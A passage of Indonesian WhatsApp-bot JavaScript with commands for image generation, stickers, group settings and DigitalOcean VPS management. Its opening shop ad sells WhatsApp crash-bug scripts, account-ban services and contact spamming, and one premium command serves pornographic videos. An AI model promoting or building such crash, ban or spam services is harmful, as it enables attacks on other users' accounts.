͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏▭▬
*❐ KONTAK PERSON:* 
*Whatsapp¹:* wa.me/6285708112935
*Whatsapp²:* wa.me/6288989928845
*Telegram:* t.me/dikatoki111
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
*❐ CHANNEL TELE:*
https://t.me/dikatokiichnl
*❐ CHANNEL WHATSAPP:* 
https://whatsapp.com/channel/0029ValalxrICVfeUyTSrV1O
▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*❐  DIKZZ-SHOP MENJUAL :*
> _Nokos wa,  jasa suntik sosmed, Panel private, Pt panel, Reseller panel, Admin panel, Murbug, Jasbug, jasarun, jasa edit sc, jasa santet wa, sc bug, sc multi device, Murid nokos, Murbot, jasa ban/unban wa, Jasa Pushkontak, sewa bot, beli bot, premium._

▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬

*Terima kasih telah bertransaksi di Dikzz-shop di tunggu order selanjutnya!*`
 // Unduh media yang direply atau dikirim
let media = await client.downloadAndSaveMediaMessage(quoted, makeid(5));
if (!isMediaa) return m.reply(`Reply/kirim gambar dengan caption *.addtesti <item> <harga> <metode pembayaran>*\n\n_Contoh:_\n.addtesti scbot 20.000 qris`)
if (!item) return m.reply(`Reply/kirim gambar dengan caption *.addtesti <item> <harga> <metode pembayaran>*\n\n_Contoh:_\n.addtesti scbot 20.000 qris`)
if (!price) return m.reply(`Reply/kirim gambar dengan caption *.addtesti <item> <harga> <metode pembayaran>*\n\n_Contoh:_\n.addtesti scbot 20.000 qris`)
if (!pay) return m.reply(`Reply/kirim gambar dengan caption *.addtesti <item> <harga> <metode pembayaran>*\n\n_Contoh:_\n.addtesti scbot 20.000 qris`)
client.sendMessage(chjid + "@newsletter", {image: media, caption: tekss});
}
break
case "flux": {
 try {
    if (!q) return m.reply('Harap masukkan teks prompt-nya!');

    let urlNya = `https://api.siputzx.my.id/api/ai/flux?prompt=${encodeURIComponent(q)}`;

    await client.sendMessage(m.chat, { image: { url: urlNya }, caption: `Berikut hasil generasi gambar untuk: *${q}*` });

  } catch (error) {
    console.log(error);
    m.reply('Terjadi kesalahan saat menghasilkan gambar. Silakan coba lagi.');
  }
  };
  break
  case "luminai": {
  if (!q) {
    return m.reply(`Contoh: ${prefix + command} hai luminai`);
  }

  const prompt = "kamu asisten google, tujuan kammu adalah membantu menjawab pertanyaan orang lain dengan detail beserta informasi link nya.";

  const requestData = { content: q, user: m.sender, prompt: prompt };

  try {
    const quoted = m && (m.quoted || m);
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }
    const response = await axios.post('https://luminai.my.id', requestData);
    
    m.reply(response.data.result);
  } catch (err) {
    m.reply(`Terjadi kesalahan: ${err.toString()}`);
  }
};
break
 case 'smeme': {
 if (!m.quoted) return m.reply(`Balas gambar dengan perintah:\n${prefix + command} <teks atas>|<teks bawah>`);
 const { Sticker } = require('wa-sticker-formatter');
 async function uguu(filePath) {
 try {
 const form = new FormData();
 form.append('files[]', fs.createReadStream(filePath));
const axios = require('axios');
 const { data } = await axios.post('https://uguu.se/upload', form, {
 headers: { ...form.getHeaders() }
 });
 return data.files[0].url;
 } catch (err) {
 throw new Error(err.message);
 }
 }
 async function createSticker(img, url) {
 let stickerMetadata = {
 type: "full",
 pack: "My Sticker",
 author: "© 𝑮𝑨𝑴𝑴𝑨-𝑩𝑶𝑻",
 quality: 100
 };
 return (new Sticker(img || url, stickerMetadata)).toBuffer();
 }
 let [atas, bawah] = text.split('|');
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || "";
 if (!mime.startsWith('image/')) return m.reply("❌ Hanya bisa digunakan untuk gambar!");
 await client.sendMessage(m.chat, { react: { text: '🕐', key: m.key } });
 let mediaBuffer = await q.download();
 let ext = mime.split('/')[1] || "png";
 let tempFile = path.join(__dirname, `temp_${Date.now()}.${ext}`);
 fs.writeFileSync(tempFile, mediaBuffer);
 try {
 let url = await uguu(tempFile);
 let memeUrl = `https://api.memegen.link/images/custom/${encodeURIComponent(atas || " ")}`
 + `/${encodeURIComponent(bawah || " ")}.png?background=${url}`;
 let stickerBuffer = await createSticker(memeUrl, false);
 await client.sendMessage(m.chat, { sticker: stickerBuffer }, { quoted: m });
 await client.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
 } catch (err) {
 console.log(err);
 m.reply("❌ Terjadi kesalahan saat membuat meme.");
 } finally {
 fs.unlinkSync(tempFile);
 }
}
break
case "bokep":{
if (!isPremium) return reply("khusus premium");
heyy = await fetchJson('https://raw.githubusercontent.com/ditss-dev/ditss/main/okep')
let yeha = heyy[Math.floor(Math.random() * heyy.length)]

				client.sendMessage(m.chat,{
			 video: {url: yeha},
 //thumbnailUrl: rees.thumbnail,
 //renderLargerThumbnail: true,
					caption: `nih`,
					footer: global.namabot,
					buttons: [
						{
							buttonId: `.${command}`,
							buttonText: {
								displayText: "lanjutt"
							}
						},
                       						{
							buttonId: `.toaudio`,

							buttonText: {
								displayText: "back sound"
							}
						}
					],
					viewOnce: true,
				}, {
					quoted: m
				});
			}
			break
case 'nulis': {
				if (!text) return m.reply(`Kirim perintah *${prefix + command}* Teksnya`)
			loading();
				const splitText = text.replace(/(\S+\s*){1,9}/g, '$&\n')
				const fixHeight = splitText.split('\n').slice(0, 31).join('\n')
				spawn('convert', [
					'./lib/nulis/images/buku/sebelumkiri.jpg',
					'-font',
					'./lib/nulis/font/Indie-Flower.ttf',
					'-size',
					'960x1280',
					'-pointsize',
					'23',
					'-interline-spacing',
					'2',
					'-annotate',
					'+140+153',
					fixHeight,
					'./lib/nulis/images/buku/setelahkiri.jpg'
				])
				client.on('error', () => m.reply(mess.error))
				client.on('exit', () => {
					client.sendMessage(m.chat, { image: fs.readFileSync('./lib/nulis/images/buku/setelahkiri.jpg'), caption: 'Jangan Malas Lord. Jadilah siswa yang rajin ರ_ರ' })
				})
			}
			break
case 'welcome': {
if (!isGroup) return reply(`khusus grup!`)
if (!isAdmins) return reply(`Khusus admin!`)
if (args[0] === "on") {
if (isWelcome) return reply(`Sudah aktif sebelumnya`)
wlcm.push(m.chat)
fs.writeFileSync('./database/welcome.json', JSON.stringify(wlcm, null, 2))
reply('Sukses mengaktifkan welcome!')
} else if (args[0] === "off") {
if (!isWelcome) return reply(`Sudah nonaktif sebelumnya`)
let anu = wlcm.indexOf(m.chat)
wlcm.splice(anu, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(wlcm, null, 2))
reply('Sukses menonaktifkan welcome!')
} else {
reply(`Contoh: ${prefix+command} on/off`)
}}
break
case 'antilink': {
if (!isGroup) return reply(`khusus grup!`)
if (!isAdmins) return reply(`Khusus admin!`)
if (!isBotAdmin) return reply(`Botnya Jadiin admin dulu`)
if (args[0] === "on") {
if (isAntilink) return reply(`Sudah aktif sebelumnya`)
antilink.push(m.chat)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Sukses mengaktifkan antilink!')
} else if (args[0] === "off") {
if (!isAntilink) return reply(`Sudah nonaktif sebelumnya`)
let anu = antilink.indexOf(m.chat)
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Sukses menonaktifkan antilink!')
} else {
reply(`Contoh: ${prefix+command} on/off`)
}}
break			
case "createvps": case "cvps": {
    if (!isCreator) return reply(mess.owner);
    if (!text) return reply(
        `ðŸ”¹ *Format Perintah Pembuatan VPS*\n\n`
        + `Gunakan format berikut:\n`
        + `\`\`\`${prefix}cvps hostname,region,image,os,version,password(optional)\`\`\`\n\n`
        + `ðŸ“Œ *Penjelasan:*\n`
        + `- *hostname* â†’ Nama server yang ingin dibuat.\n`
        + `- *region* â†’ Lokasi server (*Lihat daftar region di bawah*).\n`
        + `- *image* â†’ Ukuran VPS yang diinginkan (*Lihat daftar ukuran di bawah*).\n`
        + `- *os* â†’ Sistem operasi (Ubuntu, Debian, CentOS, dll.).\n`
        + `- *version* â†’ Versi OS (*Lihat daftar versi di bawah*).\n`
        + `- *password* (opsional) â†’ Jika kosong, bot akan membuat otomatis.\n\n`
        + `âœ… *Contoh Pemakaian:*\n`
        + `\`\`\`!createvps myserver,sgp1,s-4vcpu-16gb,ubuntu,22-04,MySecurePass123\`\`\`\n\n`
        + `ðŸ—ºï¸ *Daftar Region DigitalOcean:*\n`
        + `â€¢ ðŸ‡¸ðŸ‡¬ *sgp1* â†’ Singapura (Asia) âœ…\n`
        + `â€¢ ðŸ‡ºðŸ‡¸ *nyc3* â†’ New York, AS\n`
        + `â€¢ ðŸ‡³ðŸ‡± *ams3* â†’ Amsterdam, Belanda\n`
        + `â€¢ ðŸ‡ºðŸ‡¸ *sfo3* â†’ San Francisco, AS\n`
        + `â€¢ ðŸ‡¬ðŸ‡§ *lon1* â†’ London, Inggris\n`
        + `â€¢ ðŸ‡©ðŸ‡ª *fra1* â†’ Frankfurt, Jerman\n\n`
        + `ðŸ–¥ï¸ *Ukuran VPS DigitalOcean:*\n`
        + `â€¢ *s-1vcpu-1gb* â†’ 1 vCPU, 1GB RAM\n`
        + `â€¢ *s-1vcpu-2gb* â†’ 1 vCPU, 2GB RAM\n`
        + `â€¢ *s-2vcpu-2gb* â†’ 2 vCPU, 2GB RAM âœ…\n`
        + `â€¢ *s-2vcpu-4gb* â†’ 2 vCPU, 4GB RAM\n`
        + `â€¢ *s-4vcpu-8gb* â†’ 4 vCPU, 8GB RAM\n`
        + `â€¢ *s-4vcpu-16gb* â†’ 4 vCPU, 16GB RAM âœ…\n`
        + `â€¢ *s-8vcpu-16gb* â†’ 8 vCPU, 16GB RAM\n`
        + `â€¢ *s-16vcpu-32gb* â†’ 16 vCPU, 32GB RAM\n\n`
        + `ðŸ“€ *OS & Versi DigitalOcean:*\n`
        + `â€¢ *Ubuntu* â†’ ubuntu *(20-04, 22-04, 24-04)*\n`
        + `â€¢ *Debian* â†’ debian *(10, 11, 12)*\n`
        + `â€¢ *CentOS* â†’ centos *(7, 8, 9)*\n\n`
        + `ðŸš€ *Siap buat VPS? Kirim perintah sekarang!*`
    );
    let argaxc = text.split(",");
    if (argaxc.length < 5) return reply("âš ï¸ Format tidak valid! Gunakan format yang benar seperti contoh di atas.");
    let [hostname, region, image, os, version, password] = argaxc;
    hostname = hostname.toLowerCase().trim();
    region = region.toLowerCase().trim();
    image = image.toLowerCase().trim();
    os = os.toLowerCase().trim();
    version = version.toLowerCase().trim();
    const availableImages = ["s-1vcpu-1gb", "s-1vcpu-2gb", "s-2vcpu-2gb", "s-2vcpu-4gb", "s-4vcpu-8gb", "s-4vcpu-16gb", "s-8vcpu-16gb", "s-16vcpu-32gb"];
    if (!availableImages.includes(image)) {
        return reply(`âš ï¸ Ukuran VPS tidak valid!\nGunakan salah satu dari daftar berikut:\n${availableImages.join(", ")}`);
    }
    if (!password) password = await generateRandomPassword();
    try {        
        let dropletData = {
            name: hostname,
            region: region, 
            size: image,
            image: `${os}-${version}-x64`,
            ssh_keys: null,
            backups: false,
            ipv6: true,
            user_data: `#cloud-config\npassword: ${password}\nchpasswd: { expire: False }`,
            private_networking: null,
            volumes: null,
            tags: ['T']
        };
        let response = await fetch('https://api.digitalocean.com/v2/droplets', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + global.apiDigitalOcean 
            },
            body: JSON.stringify(dropletData)
        });
        let responseData = await response.json();
        if (response.ok) {
            let dropletConfig = responseData.droplet;
            let dropletId = dropletConfig.id;
            await reply(`Memproses pembuatan VPS...`);
            await new Promise(resolve => setTimeout(resolve, 60000));
            let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': "Bearer " + global.apiDigitalOcean
                }
            });
            let dropletInfo = await dropletResponse.json();
            let ipVPS = dropletInfo.droplet.networks.v4.length > 0 
                ? dropletInfo.droplet.networks.v4[0].ip_address 
                : "Tidak ada alamat IP yang tersedia";
            let messageText = `âœ… *VPS Berhasil Dibuat!*\n\n`
                + `ðŸ“Œ *Hostname:* ${hostname}\n`
                + `ðŸŒ *Region:* ${region}\n`
                + `ðŸ’¾ *Spesifikasi:* ${image}\n`
                + `ðŸ“€ *OS:* ${os.toUpperCase()} ${version}\n`
                + `ðŸ“¡ *IP VPS:* ${ipVPS}\n`
                + `ðŸ” *Password:* ${password}`;
            await client.sendMessage(m.chat, { text: messageText });
        } else {
            throw new Error(`Gagal membuat VPS: ${responseData.message}`);
        }
    } catch (err) {
        console.log(err);
        reply(`âŒ *Terjadi kesalahan saat membuat VPS:*\n${err.message}`);
    }
}
break

case "deldroplet": {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("iddroplet"))
let dropletId = text
let deleteDroplet = async () => {
try {
let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
method: 'DELETE',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
}
});

if (response.ok) {
reply('Droplet berhasil dihapus!');
} else {
const errorData = await response.json();
return new Error(`Gagal menghapus droplet: ${errorData.message}`);
}
} catch (error) {
console.log('Terjadi kesalahan saat menghapus droplet:', error);
reply('Terjadi kesalahan saat menghapus droplet.');
}};
deleteDroplet();
}
break

case 'listdroplet': {
  if (!isCreator) return Reply(mess.owner)
  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + global.apiDigitalOcean
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (err) {
        reply('Error fetching droplets: ' + err);
        return [];
      }
    };
    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List droplet digital ocean kamu: ${totalvps}\n\n`;
      if (droplets.length === 0) {
        mesej += 'Tidak ada droplet yang tersedia!';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';
          mesej += `â€¢ ID: ${droplet.id}
- Hostname: ${droplet.name}
- Status: ${droplet.status}
- Lokasi: ${droplet.region.name}
- IP: ${ipAddress}
- OS: ${droplet.image.distribution} (${droplet.image.name})
- RAM: ${droplet.memory} MB
- CPU: ${droplet.vcpus} vCPU
- Disk: ${droplet.disk} GB
- Size Slug: ${droplet.size_slug}
- Created: ${droplet.created_at}

`;
        });
      }
      client.sendMessage(m.chat, { text: mesej }, { quoted: m });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }
}
break

case "poweron": {
  if (!isCreator) return reply(mess.owner);
  if (!text) return reply("Kirim ID droplet yang ingin dinyalakan!\nContoh: poweron 123456789");

  try {
    let response = await fetch(`https://api.digitalocean.com/v2/droplets/${text}/actions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify({ type: "power_on" })
    });
    if (response.ok) {
      reply(`âœ… VPS dengan ID ${text} sedang dinyalakan...`);
    } else {
      let data = await response.json();
      reply(`âŒ Gagal menyalakan VPS:\n${data.message}`);
    }
  } catch (err) {
    reply(`âŒ Terjadi kesalahan:\n${err.message}`);
  }
}
break

case "poweroff": {
  if (!isCreator) return reply(mess.owner);
  if (!text) return reply("Kirim ID droplet yang ingin dimatikan!\nContoh: poweroff 123456789");

  try {
    let response = await fetch(`https://api.digitalocean.com/v2/droplets/${text}/actions`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + global.apiDigitalOcean
      },
      body: JSON.stringify({ type: "shutdown" })
    });
    if (response.ok) {
      reply(`âœ… VPS dengan ID ${text} sedang dimatikan...`);
    } else {
      let data = await response.json();
      reply(`âŒ Gagal mematikan VPS:\n${data.message}`);
    }
  } catch (err) {
    reply(`âŒ Terjadi kesalahan:\n${err.message}`);
  }
}
break

case 'resizevps': {
  if (!isCreator) return Reply(mess.owner)
  if (!q) return reply('Format: resizevps id_droplet,slug_baru\nContoh: resizevps 123456,s-2vcpu-2gb\n\nKetik *resizevps list* untuk melihat semua slug ukuran VPS.')
  if (q.trim().toLowerCase() === 'list') {
    try {
      const res = await fetch('https://api.digitalocean.com/v2/sizes', {
        headers: {
          Authorization: `Bearer ${global.apiDigitalOcean}`
        }
      });
      const { sizes } = await res.json();
      let teks = '*List Ukuran VPS (Slug):*\n\n';
      sizes.forEach(size => {
        teks += `â€¢ ${size.slug}
  - RAM: ${size.memory} MB
  - vCPU: ${size.vcpus}
  - Disk: ${size.disk} GB
  - Transfer: ${size.transfer} TB
  - Price: $${size.price_monthly}/bulan
\n`;
      });
      return reply(teks);
    } catch (e) {
      console.log(e)
      return reply('Gagal mengambil list ukuran VPS.')
    }
  }
  const [id, slug] = q.split(',');
  if (!id || !slug) return reply('Format: resizevps id_droplet,slug_baru\nContoh: resizevps 123456,s-2vcpu-2gb');
  function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  try {
    reply(`âš™ï¸ Mematikan VPS ${id} terlebih dahulu...`);
    const powerOff = await fetch(`https://api.digitalocean.com/v2/droplets/${id}/actions`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${global.apiDigitalOcean}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type: 'power_off' })
    });
    if (!powerOff.ok) return reply('âŒ Gagal mematikan VPS.');
    reply(`âœ… VPS ${id} dimatikan, tunggu beberapa detik...`);
    await delay(15000);
    reply(`âš™ï¸ Melakukan resize ke ukuran ${slug.trim()}...`);
    const resize = await fetch(`https://api.digitalocean.com/v2/droplets/${id}/actions`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${global.apiDigitalOcean}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type: 'resize', size: slug.trim(), disk: true })
    });
    if (!resize.ok) return reply('âŒ Gagal resize VPS. Pastikan slug ukuran valid.');
    reply(`âœ… Resize sedang diproses...`);
    await delay(10000);
    reply(`âš™ï¸ Menyalakan kembali VPS ${id}...`);
    const powerOn = await fetch(`https://api.digitalocean.com/v2/droplets/${id}/actions`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${global.apiDigitalOcean}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({ type: 'power_on' })
    });
    if (!powerOn.ok) return reply('âš ï¸ Resize berhasil, tapi gagal menyalakan kembali VPS.');
    reply(`âœ… VPS ${id} berhasil dinyalakan kembali setelah resize!`);
  } catch (e) {
    console.log(e)
    reply('âŒ Terjadi kesalahan saat resize VPS.')
  }
}
break

    case 'rebuildvps': case "rebuild": {
    if (!isCreator) return reply(mess.owner);
    if (!text) return reply(
        `ðŸ”¹ *Format Perintah Rebuild VPS*\n\n`
        + `Gunakan format berikut:\n`
        + `\`\`\`${prefix}rebuildvps iddroplet,image\`\`\`\n\n`
        + `ðŸ“Œ *Penjelasan:*\n`
        + `- *iddroplet* â†’ ID VPS yang ingin direbuild.\n`
        + `- *image* â†’ Slug image yang akan digunakan (Ubuntu, Debian, CentOS, dll.).\n\n`
        + `âœ… *Contoh Pemakaian:*\n`
        + `\`\`\`!rebuildvps 12345678,ubuntu-22-04-x64\`\`\`\n\n`
        + `ðŸ“€ *Daftar OS yang Tersedia:*\n`
        + `â€¢ *Ubuntu* â†’ ubuntu-20-04-x64, ubuntu-22-04-x64, ubuntu-24-04-x64\n`
        + `â€¢ *Debian* â†’ debian-10-x64, debian-11-x64, debian-12-x64\n`
        + `â€¢ *CentOS* â†’ centos-7-x64, centos-8-x64, centos-9-x64\n\n`
        + `ðŸš€ *Kirim perintah untuk memulai rebuild VPS!*`
    );
    let argszx = text.split(",");
    if (argszx.length < 2) return reply("âš ï¸ Format tidak valid! Gunakan format yang benar seperti contoh di atas.");
    let [dropletId, image] = argszx;
    dropletId = dropletId.trim();
    image = image.trim();
    let rebuildVPS = async () => {
        try {
            const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${global.apiDigitalOcean}`
                },
                body: JSON.stringify({
                    type: 'rebuild',
                    image: image
                })
            });
            if (response.ok) {
                const data = await response.json();
                reply(`ðŸ”„ *Rebuild VPS sedang diproses...*\nðŸ†” *Droplet ID:* ${dropletId}\nðŸ–¥ï¸ *Image:* ${image}\nâ³ Mohon tunggu sekitar 1-2 menit...`);
                await new Promise(resolve => setTimeout(resolve, 60000)); 
                const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${global.apiDigitalOcean}`
                    }
                });

                if (vpsInfo.ok) {
                    const vpsData = await vpsInfo.json();
                    const droplet = vpsData.droplet;
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

                    let textvps = `âœ… *VPS BERHASIL DIREBUILD!*\n\n`
                        + `ðŸ†” *Droplet ID:* ${dropletId}\n`
                        + `ðŸ“€ *Sistem Baru:* ${droplet.image.slug}\n`
                        + `ðŸ“¡ *IP VPS:* ${ipAddress}\n\n`
                        + `ðŸ” *Gunakan password lama atau periksa email DigitalOcean untuk login baru.*`;

                    await client.sendMessage(m.chat, { text: textvps });
                } else {
                    reply('âš ï¸ *Gagal mendapatkan informasi VPS setelah rebuild!*');
                }
            } else {
                const errorData = await response.json();
                reply(`âŒ *Gagal melakukan rebuild VPS:*\n${errorData.message}`);
            }
        } catch (err) {
            reply(`âŒ *Terjadi kesalahan saat rebuild VPS:*\n${err.message}`);
        }
    };
    rebuildVPS();
}
break

case 'restartvps': {
if (!isCreator) return Reply(mess.owner)
if (!text) return reply(example("iddroplet"))
let dropletId = text
const restartVPS = async (dropletId) => {
try {
const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

const response = await fetch(apiUrl, {
method: 'POST',
headers: {
'Content-Type': 'application/json',
'Authorization': `Bearer ${global.apiDigitalOcean}`
},
body: JSON.stringify({
type: 'reboot'
})
});

if (response.ok) {
const data = await response.json();
return data.action;
} else {
const errorData = await response.json();
reply(`Gagal melakukan restart VPS: ${errorData.message}`);
}
} catch (err) {
reply('Terjadi kesalahan saat melakukan restart VPS: ' + err);
}
};

restartVPS(dropletId)
.then((action) => {
reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
})
.catch((err) => {
reply(err);
})

}
break 

case "sisadroplet": {
if (!isCreator) return Reply(mess.owner)
async function getDropletInfo() {
try {
const axios = require('axios');
const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
headers: {
Authorization: `Bearer ${global.apiDigitalOcean}`,
},
});

if (accountResponse.status === 200 && dropletsResponse.status === 200) {
const dropletLimit = accountResponse.data.account.droplet_limit;
const dropletsCount = dropletsResponse.data.droplets.length;
const remainingDroplets = dropletLimit - dropletsCount;

return {
dropletLimit,
remainingDroplets,
totalDroplets: dropletsCount,
};
} else {
return new Error('Gagal mendapatkan data akun digital ocean atau droplet!');
}
} catch (err) {
return err;
}}
async function sisadropletHandler() {
try {
if (!isCreator) return Reply(mess.owner)

const dropletInfo = await getDropletInfo();
reply(`Sisa droplet yang dapat kamu pakai: ${dropletInfo.remainingDroplets}

Total droplet terpakai: ${dropletInfo.totalDroplets}`);
} catch (err) {
reply(`Terjadi kesalahan: ${err}`);
}}
sisadropletHandler();
}
break

case 'totaldroplet':
if (!isCreator) return Reply(mess.owner)
  try {
    const apiKey = global.apiDigitalOcean
    if (apiKey == "-" || !apiKey) return reply("API DigitalOcean belum disetting di global.apiDigitalOcean")
    const dropletRes = await fetch(`https://api.digitalocean.com/v2/droplets`, {
      headers: { Authorization: `Bearer ${apiKey}` }
    })
    const dropletData = await dropletRes.json()
    if (!dropletData.droplets || dropletData.droplets.length === 0) return reply("Tidak ada droplet yang ditemukan.")
    const sizeRes = await fetch(`https://api.digitalocean.com/v2/sizes`, {
      headers: { Authorization: `Bearer ${apiKey}` }
    })
    const sizeData = await sizeRes.json()
    let totalHarga = 0
    let teks = `*Total Droplet:* ${dropletData.droplets.length}\n\n`
    for (let droplet of dropletData.droplets) {
      const nama = droplet.name
      const ukuran = droplet.size_slug
      const harga = sizeData.sizes.find(s => s.slug === ukuran)?.price_monthly || 0
      totalHarga += harga
      teks += `â€¢ ${nama} - ${ukuran} - *$${harga}/bulan*\n`
    }
    teks += `\n*Total Biaya VPS:* *$${totalHarga.toFixed(2)}/bulan*`
    reply(teks)
  } catch (err) {
    console.log(err)
    reply("Gagal mengambil data droplet.")
  }
  break

case 'setapido': case 'setapidigitalocean': case 'upapido': {
    if (!isCreator) return reply('*[ System Notice ]* Khusus Owner');
    if (text || m.quoted) {
        const newteks = m.quoted ? m.quoted.text : text;
        global.apiDigitalOcean = newteks;
        
        try {
            const fs = require('fs');
            const path = './settings.js'; 
           let content = fs.readFileSync(path, 'utf8');
            const apidoRegex = /(global\.apiDigitalOcean\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(apidoRegex, `$1${newteks}$3`);
            fs.writeFileSync(path, content);
            await client.sendMessage(m.chat, { text: "_Berhasil Mengganti Api Digital Oceanâœ…_" }, { quoted: m });
        } catch (error) {
            console.log('Error updating settings.js:', error);
            await client.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
